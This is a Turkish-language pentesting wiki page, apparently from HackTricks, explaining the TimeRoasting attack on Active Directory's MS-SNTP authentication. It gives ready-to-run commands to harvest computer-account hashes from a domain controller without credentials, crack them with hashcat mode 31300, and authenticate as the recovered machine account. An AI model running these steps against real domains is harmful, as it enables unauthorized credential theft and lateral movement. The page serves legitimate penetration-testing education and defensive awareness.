# TimeRoasting

{{#include ../../banners/hacktricks-training.md}}

TimeRoasting, eski MS-SNTP authentication mekanizmasını kötüye kullanır. Kimlik doğrulaması yapılmamış bir istemci, seçilen bir bilgisayar hesabı RID'sini içeren 68 baytlık bir istek gönderebilir. Exploitable legacy path için domain controller, response authenticator'ı bilgisayar hesabının NT hash'i (MD4 türevi password secret) üzerinden Netlogon aracılığıyla oluşturur ve saldırgana offline password guessing için uygun bir challenge/MAC çifti sağlar (Hashcat mode 31300).<sup>[[1]](#references)[[2]](#references)</sup>

MS-SNTP'nin 3.1.5.1 ve 4. bölümleri request ve response davranışını açıklar:<sup>[[1]](#references)</sup>
![TimeRoasting: Ayrıntılar için resmi MS-SNTP spesifikasyonundaki 3.1.5.1 "Authentication Request Behavior" ve 4 "Protocol Examples" bölümlerine bakın](../../images/Pasted%20image%2020250709114508.png)
`ExtendedAuthenticatorSupported` false olduğunda request, RID'yi authenticator'ın Key Identifier alanının düşük 31 bitinde ve bir selector bitini yüksek bitte saklar. Server, 68 baytlık uzunluğu doğrular, RID'yi çıkarır, Netlogon'dan candidate checksum'ları hesaplamasını ister, yüksek bitteki selector'ı kullanarak bunlardan birini seçer, response Key Identifier değerini sıfırlar ve seçilen checksum'ı döndürür.<sup>[[1]](#references)</sup>

Crypto-checksum MD5 tabanlıdır (bkz. 3.2.5.1.1) ve offline olarak crack edilebilir; bu da roasting saldırısını mümkün kılar.<sup>[[1]](#references)</sup>

## Saldırı Nasıl Gerçekleştirilir

[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Tom Tervoort tarafından geliştirilen Timeroasting script'leri<sup>[[3]](#references)</sup>
```bash
sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
hashcat -m 31300 ntp-hashes.txt
```
---

## NetExec + Hashcat ile pratik saldırı (kimlik doğrulamasız)

- NetExec'in `timeroast` modülü bilgisayar RID'lerini enumerate edebilir, kimlik doğrulaması olmadan MS-SNTP MAC'lerini toplayabilir ve cracking için hazır `$sntp-ms$` hash'lerini yazdırabilir:<sup>[[4]](#references)</sup>
```bash
# Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
netexec smb <dc_fqdn_or_ip> -M timeroast
# Output example lines: $sntp-ms$*<rid>*md5*<salt>*<mac>
```
- Hashcat mode 31300 (MS-SNTP MAC) ile offline crack edin:<sup>[[5]](#references)</sup>
```bash
hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username
# or let recent hashcat auto-detect; keep RIDs with --username for convenience
```
- Elde edilen cleartext bir bilgisayar hesabı parolasına karşılık gelir. NTLM devre dışı bırakıldığında, bunu Kerberos (-k) kullanarak doğrudan makine hesabı olarak deneyin:
```bash
# Example: cracked for RID 1125 -> likely IT-COMPUTER3$
netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
```
### Operasyon notları
- Kerberos ile kurtarılan kimlik bilgilerini kullanmadan önce doğru zamanı sağlayın. `chronyd`/`systemd-timesyncd` gibi güncel tutulan bir NTP client tercih edin; `ntpdate` burada yaygın bir lab komutu olarak korunmuştur: `sudo ntpdate <dc_fqdn>`.
- Gerekirse AD realm için krb5.conf oluşturun: `netexec smb <dc_fqdn> --generate-krb5-file krb5.conf`
- Herhangi bir authenticated foothold elde ettikten sonra RID'leri LDAP/BloodHound üzerinden principal'larla eşleyin.

## References

- [1] [MS-SNTP: Microsoft Basit Ağ Zaman Protokolü](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
- [2] [Secura – Timeroasting teknik raporu](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
- [3] [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
- [4] [NetExec — `timeroast` modül kaynak kodu](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/timeroast.py)
- [5] [Hashcat modu 31300 – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)
{{#include ../../banners/hacktricks-training.md}}
